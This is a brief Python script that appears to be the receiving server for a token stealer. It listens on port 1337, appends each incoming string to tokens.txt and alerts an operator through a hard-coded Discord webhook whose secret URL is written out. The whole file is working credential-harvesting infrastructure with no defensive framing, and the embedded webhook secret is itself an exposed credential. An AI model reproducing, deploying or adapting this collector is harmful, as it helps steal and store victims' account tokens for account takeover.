from socket import *
from dhooks import Webhook
socket = socket(AF_INET,SOCK_STREAM)
socket.bind(("0.0.0.0",1337))
socket.listen()
hook = Webhook('https://discord.com/api/webhooks/1082653280561283153/Ty4g4tQ5HpIXOuUlzAXrAQkYiPNHKjfTJeUNxblXt7BZPt8_ybI_GWMIPGj17UE1HOv-')
while True:
    conn,addr = socket.accept() 
    data = conn.recv(1024)
    if not data:
        break
    data = data.decode("utf-8")
    with open('tokens.txt', 'a') as f:
        f.write(data + '\n')
        print(data)
        hook.send("New token stored in tokens.txt <@1009012771091914783>")
